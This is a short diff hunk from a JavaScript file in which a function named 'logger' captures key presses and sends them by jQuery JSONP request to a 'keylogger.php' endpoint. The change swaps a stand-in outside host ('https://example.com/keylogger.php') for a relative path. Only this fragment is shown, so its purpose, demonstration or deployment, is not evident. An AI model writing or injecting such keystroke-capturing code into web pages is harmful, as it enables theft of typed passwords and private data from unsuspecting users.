@@ -11,7 +11,7 @@ function logger(keyPress){
    jQuery.ajax({
       dataType: "jsonp",
       type:"GET",
-      url: "https://example.com/keylogger.php",
+      url: "keylogger.php",
       jsonp:"keypressed",
       data:{
           altnKey:keyPress.altKey?1:0,
